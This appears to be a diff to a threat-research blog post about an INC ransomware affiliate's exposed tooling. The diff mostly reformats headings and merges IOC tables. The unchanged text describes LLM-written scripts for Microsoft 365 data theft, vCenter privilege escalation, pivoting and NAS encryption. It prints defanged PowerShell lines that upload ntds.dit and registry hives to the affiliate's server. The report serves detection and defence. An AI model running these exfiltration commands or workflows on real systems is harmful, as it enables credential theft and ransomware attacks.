@@ -7,12 +7,20 @@ header:
 description: "Exposed operator tooling shows an INC affiliate using likely LLM-generated scripts to enumerate, pivot, and deploy ransomware against network storage"
 categories:
   - Threat Research
+content_type: research
 tags:
-  - Threat Research
+  - Ransomware
+  - NAS
+  - DFIR
+  - C2
+  - Cloud
+  - AI
+  - China
+  - Credential Theft
 toc: true
 ---
 
-# Overview
+## Overview
 
 Using the [Hunt.io](https://hunt.io/) platform, Ctrl-Alt-Intel researchers discovered an exposed operator working directory containing evidence of an active ransomware intrusion against a Chinese technology organisation. The collection linked cloud-data theft, Active Directory compromise, internal tunnelling, attacks against storage and virtualisation management planes, and the deployment of an INC encryptor against network-attached storage (NAS).
 
@@ -26,7 +34,7 @@ We assess with **high confidence** that the server belongs to an **INC Ransom af
 
 More than 50 Python scripts wrapped Microsoft Graph, WinRM, VMware, storage, backup, SSH, and Windows administration interfaces into short, single-purpose workflows. We assess that the affiliate leveraged Large Language Model (LLM) to generate a significant amounts of operator tooling that was leveraged in the intrusion.
 
-# Intrusion Summary
+## Intrusion Summary
 
 From the recovered tooling, scripts, artifacts and exfiltrated data was found on the IP address `213.176.114[.]6`. From this, we assess the INC Ransom affiliate did the following:
 
@@ -38,13 +46,13 @@ From the recovered tooling, scripts, artifacts and exfiltrated data was found on
 * Create internal forwards to otherwise unreachable management services.
 * Map NAS shares to the pivot and launch the INC Windows encryptor against each drive.
 
-# Enumeration / Discovery
+## Enumeration / Discovery
 
 The affiliate began by turning compromised Microsoft 365 access into infrastructure intelligence. Python scripts authenticated to Microsoft Graph, searched mailboxes, OneDrive, and SharePoint, and downloaded files likely to contain network diagrams, VPN information, device inventories, VMware exports, passwords, and recovery procedures.
 
 They were repeatedly refined around networking, firewalls, storage, virtualisation, backup systems, and named members of the victim's IT team. This gave the affiliate a route from a user mailbox to the organisation's administrative plane.
 
-## M365 Targeting
+### M365 Targeting
 
 One likely AI-assisted script used the OAuth resource owner password credentials (ROPC) flow to exchange a stolen username and password for a Microsoft Graph token. It then searched the compromised mailbox for operationally useful subjects such as network-circuit relocations, server-room migrations, firewall changes, public IP addresses, VPNs, and internet-service providers.
 
@@ -137,9 +145,9 @@ The resulting discovery covered:
 * vCenter and ESXi hosts, NAS devices, NetApp and OceanStor storage, and backup infrastructure;
 * Microsoft 365 mail, attachments, OneDrive, and SharePoint content.
 
-# Lateral Movement
+## Lateral Movement
 
-A compromised domain administrator account was used over WinRM to control an internal Windows server. 
+A compromised domain administrator account was used over WinRM to control an internal Windows server.
 
 The recovered scripts used or attempted to use:
 
@@ -150,17 +158,17 @@ The recovered scripts used or attempted to use:
 * ONTAP and OceanStor management APIs for storage enumeration and modification;
 * native Windows tooling, NetExec, Impacket, DSInternals, and volume snapshots for credential theft.
 
-The affiliate exported the Active Directory database together with the `SAM`, `SECURITY`, and `SYSTEM` registry hives. Receiver logs recorded successful uploads of all four artefacts to affiliate-controlled infrastructure. 
+The affiliate exported the Active Directory database together with the `SAM`, `SECURITY`, and `SYSTEM` registry hives. Receiver logs recorded successful uploads of all four artefacts to affiliate-controlled infrastructure.
 
 The management-plane targeting was unusually broad. Scripts granted a compromised identity the global `Administrator` role in vCenter, attempted to reset appliance and SSO credentials, enabled or checked ESXi remote access, queried backup credentials, and modified NetApp export policies. OceanStor scripts cycled through authentication and enumeration approaches while attempting to avoid or recover from account lockouts.
 
-# vCenter / ESXi Targeting
+## vCenter / ESXi Targeting
 
 The recovered VMware scripts show the INC affiliate attempting to move from domain-level access into the virtualisation control plane. Five Python files used `pyVmomi` or vCenter REST APIs to enumerate the environment, change permissions, enable remote access, manipulate snapshots, and explore several routes to resetting vCenter appliance credentials.
 
 This targeting is significant because vCenter access concentrates control over large numbers of virtual machines. An affiliate that can modify global permissions, reach ESXi management services, or run Guest Operations against the vCenter Server Appliance can potentially bypass many controls applied to individual workloads.
 
-## vCenter Permissions and Appliance Changes
+### vCenter Permissions and Appliance Changes
 
 `vc_perms.py` connected to vCenter with a compromised domain identity and disabled certificate verification. It located the built-in `Administrator` role, represented internally by role ID `-1`, then attempted to assign that role to the compromised account at the vCenter root folder with inheritance enabled.
 
@@ -224,7 +232,7 @@ requests.put(
 
 Other scripts tried to reach the same objective through VMware Guest Operations. `vc_reset.py` located the vCenter Server Appliance as a VM, tested compromised accounts for guest authentication, and prepared commands to reset both the operating-system `root` account and the SSO administrator. `vc_pwreset.py` explored session tickets, SAML authentication, VIX, and the Extension Manager, but retained comments acknowledging that several approaches could not proceed without valid guest credentials.
 
-# Pivoting / C2
+## Pivoting / C2
 
 The affiliate used the compromised Windows server as a bridge between the external operator host and internal management services. One Python script created multiple Windows `portproxy` rules and opened a matching firewall rule. A companion shell script started attacker-side `socat` listeners.
 
@@ -254,11 +262,11 @@ session.run_ps(powershell)
 
 Separate scripts staged an HTTP receiver on affiliate infrastructure and pushed the domain database and registry hives to it. The corresponding log recorded successful HTTP responses for each upload. The collection also contained evidence of a live VPN session using compromised credentials, showing that the affiliate retained an additional route into the environment while the working directory was exposed.
 
-# Ransomware Deployment
+## Ransomware Deployment
 
 The affiliate did not need to execute native code on the NAS appliance in order to encrypt its data. Instead, `nas_locker.py` mapped five SMB shares to drive letters on the compromised Windows pivot and launched the Windows INC encryptor against those mapped drives.
 
-## NAS Targeting and Validation
+### NAS Targeting and Validation
 
 The NAS was not selected blindly. A companion script, `nas_check.py`, paused before connecting to the pivot, checked whether `locker.exe` was running, mapped selected NAS shares, listed their root directories, and then removed the mappings. This gave the affiliate a quick way to validate access and inspect the target before or after the ransomware task ran.
 
@@ -328,7 +336,7 @@ session.run_ps(powershell)
 
 The executable's interface matches the recovered INC sample: `fast`, `medium`, and `slow` modes, plus a directory argument. The Windows binary was written in Rust and contained functionality for recursive local and network-share encryption, selective fast encryption, process and service termination, shadow-copy removal, and exclusions for selected system and security-software paths. The same archive included payloads for Linux, ESXi, and numerous processor architectures, demonstrating that the affiliate had access to a broader cross-platform impact kit.
 
-# Assessing the Use of AI
+## Assessing the Use of AI
 
 We assess with **high confidence** that the INC affiliate used an LLM to create and modify much of the Python-based operational tooling.
 
@@ -347,58 +355,59 @@ Several scripts preserve a running conversation with the code. Comments propose 
 
 These comments matter because they mirror the actual file sequence. Scripts with names containing `auth`, `try2`, `open`, `fix`, `final`, and `super` show the LLM iterating through API paths, authentication formats, and privilege changes as earlier approaches failed.
 
-# Conclusion
+## Conclusion
 
 The exposed directory shows an INC affiliate using LLM-generated scripts to connect stolen credentials, Active Directory compromise, vCenter/ESXi targeting, internal tunnelling, and NAS encryption. The best opportunity to stop this activity is before `locker.exe` runs: detect abnormal cloud authentication, WinRM, management-plane changes, and internal proxies.
 
-# IOCs
+## IOCs
 
-## Network Indicators
-
-| Indicator | Role | Confidence |
-|---|---|---:|
-| `213.176.114[.]6` | Affiliate-controlled C2/staging server; open directory on TCP/8888 and confirmed HTTP PUT exfiltration receiver on TCP/7777 | High |
-| `incblog6qu4y4mm4zvw5nrmue6qbwtgjsxpw6b7ixzssu36tsajldoad[.]onion` | INC data-leak site embedded in the payloads | High |
-| `incblog[.]su` | INC clearnet leak-site address embedded in the payloads | High |
-
-## Host, Task, and Service Artefacts
-
-| Artefact | Type | Context |
-|---|---|---|
-| `C:\Windows\Temp\locker.exe` | File | Windows INC encryptor staged under the deployment name |
-| `l.exe` | File | Name of the recovered Windows INC encryptor on affiliate infrastructure |
-| `C:\Windows\Temp\go.bat` | File | Batch file used to map shares and launch the encryptor |
-| `INC-README.txt` | File | Ransom note created by the INC payload |
-| `.INC` | Extension | Encrypted-file extension/marker; validate with local telemetry |
-| `C:\Users\Public\mimi.exe` | File | Mimikatz path explicitly checked by the affiliate's credential-harvesting script |
-| `WinUpdate` | Scheduled task | Highest-privilege task used to launch `go.bat` |
-| `TunnelPorts` | Windows Firewall rule | Allowed inbound access to the affiliate's port-proxy listeners |
-| `HTTP9999` | Windows Firewall rule | Opened TCP/9999 for temporary HTTP access to staged files |
-| `TSM-SSH` | ESXi service | Started through `pyVmomi` to enable direct ESXi SSH access |
-| `pw-reset-temp` | vCenter snapshot | Snapshot name used by the attempted vCenter password-reset workflow |
-
-Recovered ransomware binary/member names included:
-
-```text
-l.exe
-locker.exe
-x86_64-pc-windows-gnu
-x86_64-unknown-linux-esxi
-x86_64-unknown-linux-gnu
-x86_64-unknown-linux-musl
-aarch64-unknown-linux-gnu
-arm-unknown-linux-gnueabi
-arm-unknown-linux-gnueabihf
-armv7-unknown-linux-gnueabi
-armv7-unknown-linux-gnueabihf
-powerpc-unknown-linux-gnu
-powerpc64-unknown-linux-gnu
-riscv64gc-unknown-linux-gnu
-s390x-unknown-linux-gnu
-sparc64-unknown-linux-gnu
-```
-
-## Command-Line and PowerShell Patterns
+| Indicator | Type | Context | Confidence | Classification |
+|---|---|---|---|---|
+| `213.176.114[.]6` | IPv4 | Network Indicators; Affiliate-controlled C2/staging server; open directory on TCP/8888 and confirmed HTTP PUT exfiltration receiver on TCP/7777 | High | reported |
+| `incblog6qu4y4mm4zvw5nrmue6qbwtgjsxpw6b7ixzssu36tsajldoad[.]onion` | Onion | Network Indicators; INC data-leak site embedded in the payloads | High | reported |
+| `incblog[.]su` | Domain | Network Indicators; INC clearnet leak-site address embedded in the payloads | High | reported |
+| `C:\Windows\Temp\locker.exe` | File path | Host, Task, and Service Artefacts; Windows INC encryptor staged under the deployment name | Not stated | reported |
+| `l.exe` | Filename | Host, Task, and Service Artefacts; Name of the recovered Windows INC encryptor on affiliate infrastructure | Not stated | reported |
+| `C:\Windows\Temp\go.bat` | File path | Host, Task, and Service Artefacts; Batch file used to map shares and launch the encryptor | Not stated | reported |
+| `INC-README.txt` | Filename | Host, Task, and Service Artefacts; Ransom note created by the INC payload | Not stated | reported |
+| `.INC` | Extension | Host, Task, and Service Artefacts; Encrypted-file extension/marker; validate with local telemetry | Not stated | reported |
+| `C:\Users\Public\mimi.exe` | File path | Host, Task, and Service Artefacts; Mimikatz path explicitly checked by the affiliate's credential-harvesting script | Not stated | reported |
+| `WinUpdate` | Scheduled task | Host, Task, and Service Artefacts; Highest-privilege task used to launch go.bat | Not stated | reported |
+| `TunnelPorts` | Firewall rule | Host, Task, and Service Artefacts; Allowed inbound access to the affiliate's port-proxy listeners | Not stated | reported |
+| `HTTP9999` | Firewall rule | Host, Task, and Service Artefacts; Opened TCP/9999 for temporary HTTP access to staged files | Not stated | reported |
+| `TSM-SSH` | Service | Host, Task, and Service Artefacts; Started through pyVmomi to enable direct ESXi SSH access | Not stated | reported |
+| `pw-reset-temp` | Snapshot | Host, Task, and Service Artefacts; Snapshot name used by the attempted vCenter password-reset workflow | Not stated | reported |
+| `l.exe` | Filename | Host, Task, and Service Artefacts; recurring artefact reported in the campaign | Not stated | reported |
+| `locker.exe` | Filename | Host, Task, and Service Artefacts; recurring artefact reported in the campaign | Not stated | reported |
+| `x86_64-pc-windows-gnu` | Filename | Host, Task, and Service Artefacts; recurring artefact reported in the campaign | Not stated | reported |
+| `x86_64-unknown-linux-esxi` | Filename | Host, Task, and Service Artefacts; recurring artefact reported in the campaign | Not stated | reported |
+| `x86_64-unknown-linux-gnu` | Filename | Host, Task, and Service Artefacts; recurring artefact reported in the campaign | Not stated | reported |
+| `x86_64-unknown-linux-musl` | Filename | Host, Task, and Service Artefacts; recurring artefact reported in the campaign | Not stated | reported |
+| `aarch64-unknown-linux-gnu` | Filename | Host, Task, and Service Artefacts; recurring artefact reported in the campaign | Not stated | reported |
+| `arm-unknown-linux-gnueabi` | Filename | Host, Task, and Service Artefacts; recurring artefact reported in the campaign | Not stated | reported |
+| `arm-unknown-linux-gnueabihf` | Filename | Host, Task, and Service Artefacts; recurring artefact reported in the campaign | Not stated | reported |
+| `armv7-unknown-linux-gnueabi` | Filename | Host, Task, and Service Artefacts; recurring artefact reported in the campaign | Not stated | reported |
+| `armv7-unknown-linux-gnueabihf` | Filename | Host, Task, and Service Artefacts; recurring artefact reported in the campaign | Not stated | reported |
+| `powerpc-unknown-linux-gnu` | Filename | Host, Task, and Service Artefacts; recurring artefact reported in the campaign | Not stated | reported |
+| `powerpc64-unknown-linux-gnu` | Filename | Host, Task, and Service Artefacts; recurring artefact reported in the campaign | Not stated | reported |
+| `riscv64gc-unknown-linux-gnu` | Filename | Host, Task, and Service Artefacts; recurring artefact reported in the campaign | Not stated | reported |
+| `s390x-unknown-linux-gnu` | Filename | Host, Task, and Service Artefacts; recurring artefact reported in the campaign | Not stated | reported |
+| `sparc64-unknown-linux-gnu` | Filename | Host, Task, and Service Artefacts; recurring artefact reported in the campaign | Not stated | reported |
+| `ef394149c8da3af730c37d550027df8639a3aaa6feaccea60112461ae6955829` | SHA256 | File Hashes; artefact: Windows INC encryptor recovered as l.exe | Not stated | reported |
+| `0206a670243efa0f736e3725c4c7c8879b262cb07af47a8dcfa18bc9787cc1bd` | SHA256 | File Hashes; artefact: Multi-platform INC payload archive (original name withheld) | Not stated | reported |
+| `034ac761c0a2baf754f9cc200824ab29fe7124402469d38afc3c5422567d17c8` | SHA256 | File Hashes; artefact: aarch64-unknown-linux-gnu | Not stated | reported |
+| `3ac3fa5f39372c2dd2822ee63f38852f6ec34a74bdbc46e34a142f8033ccb969` | SHA256 | File Hashes; artefact: arm-unknown-linux-gnueabi | Not stated | reported |
+| `7dc832f876ace2d6b763f7c19f29a206dd74a5265a76dc9009fde9e8c0846656` | SHA256 | File Hashes; artefact: arm-unknown-linux-gnueabihf | Not stated | reported |
+| `db29c0b4d16a4f02bb1631a2eca6e589e13fb6470f20453a393604954b53562e` | SHA256 | File Hashes; artefact: armv7-unknown-linux-gnueabi | Not stated | reported |
+| `b3ec3e4e7ab1cae84d9c4cdd63425318588e5d94c2dd720387842969b3bb8507` | SHA256 | File Hashes; artefact: armv7-unknown-linux-gnueabihf | Not stated | reported |
+| `5341a686d27b38b7ee580febddcd5817aeef5f94815ff291e508ecaf78cb1070` | SHA256 | File Hashes; artefact: powerpc-unknown-linux-gnu | Not stated | reported |
+| `4aaa4cc22addcf3bb54c5ffa16bd2be4b0b0b0437edb29b844b496abc64b9eec` | SHA256 | File Hashes; artefact: powerpc64-unknown-linux-gnu | Not stated | reported |
+| `4e83e8236ad7ef73ba0197ffe72b595c29e3ce5efd5c6c98c7663ad55e1646d0` | SHA256 | File Hashes; artefact: riscv64gc-unknown-linux-gnu | Not stated | reported |
+| `e9ccbb0df3f01ed4a94f7677c802a032edfe8d23c5769522482f94016c81b507` | SHA256 | File Hashes; artefact: s390x-unknown-linux-gnu | Not stated | reported |
+| `7477da223bbb0752653f32e60c05eb5c03daf3a5afe89d6565958525a274e211` | SHA256 | File Hashes; artefact: sparc64-unknown-linux-gnu | Not stated | reported |
+| `753207ad5e72ddc6b13889132e5de18836b1a2acf954443655fea82b430e4c99` | SHA256 | File Hashes; artefact: x86_64-unknown-linux-esxi | Not stated | reported |
+| `c616e11a2ce7feb3207c1808714d056c9c216f429ad6b840e781f3494ac8485d` | SHA256 | File Hashes; artefact: x86_64-unknown-linux-gnu | Not stated | reported |
+| `126597ea3130600a83ba2ced62e70abb985fcd401ab70525650bb9a1354ca955` | SHA256 | File Hashes; artefact: x86_64-unknown-linux-musl | Not stated | reported |
 
 The following patterns have been defanged and stripped of victim-specific values:
 
@@ -426,27 +435,7 @@ Invoke-WebRequest -Uri "hxxp://213.176.114[.]6:7777/SYSTEM" -Method PUT -InFile 
 Invoke-WebRequest -Uri "hxxp://213.176.114[.]6:7777/ntds.dit" -Method PUT -InFile "C:\Windows\Temp\ntds.dit"
 ```
 
-## File Hashes
-
-| Artefact | SHA-256 |
-|---|---|
-| Windows INC encryptor recovered as `l.exe` | `ef394149c8da3af730c37d550027df8639a3aaa6feaccea60112461ae6955829` |
-| Multi-platform INC payload archive (original name withheld) | `0206a670243efa0f736e3725c4c7c8879b262cb07af47a8dcfa18bc9787cc1bd` |
-| `aarch64-unknown-linux-gnu` | `034ac761c0a2baf754f9cc200824ab29fe7124402469d38afc3c5422567d17c8` |
-| `arm-unknown-linux-gnueabi` | `3ac3fa5f39372c2dd2822ee63f38852f6ec34a74bdbc46e34a142f8033ccb969` |
-| `arm-unknown-linux-gnueabihf` | `7dc832f876ace2d6b763f7c19f29a206dd74a5265a76dc9009fde9e8c0846656` |
-| `armv7-unknown-linux-gnueabi` | `db29c0b4d16a4f02bb1631a2eca6e589e13fb6470f20453a393604954b53562e` |
-| `armv7-unknown-linux-gnueabihf` | `b3ec3e4e7ab1cae84d9c4cdd63425318588e5d94c2dd720387842969b3bb8507` |
-| `powerpc-unknown-linux-gnu` | `5341a686d27b38b7ee580febddcd5817aeef5f94815ff291e508ecaf78cb1070` |
-| `powerpc64-unknown-linux-gnu` | `4aaa4cc22addcf3bb54c5ffa16bd2be4b0b0b0437edb29b844b496abc64b9eec` |
-| `riscv64gc-unknown-linux-gnu` | `4e83e8236ad7ef73ba0197ffe72b595c29e3ce5efd5c6c98c7663ad55e1646d0` |
-| `s390x-unknown-linux-gnu` | `e9ccbb0df3f01ed4a94f7677c802a032edfe8d23c5769522482f94016c81b507` |
-| `sparc64-unknown-linux-gnu` | `7477da223bbb0752653f32e60c05eb5c03daf3a5afe89d6565958525a274e211` |
-| `x86_64-unknown-linux-esxi` | `753207ad5e72ddc6b13889132e5de18836b1a2acf954443655fea82b430e4c99` |
-| `x86_64-unknown-linux-gnu` | `c616e11a2ce7feb3207c1808714d056c9c216f429ad6b840e781f3494ac8485d` |
-| `x86_64-unknown-linux-musl` | `126597ea3130600a83ba2ced62e70abb985fcd401ab70525650bb9a1354ca955` |
-
-# MITRE ATT&CK
+## MITRE ATT&CK
 
 | Tactic | ID | Technique | Observed use |
 |---|---|---|---|
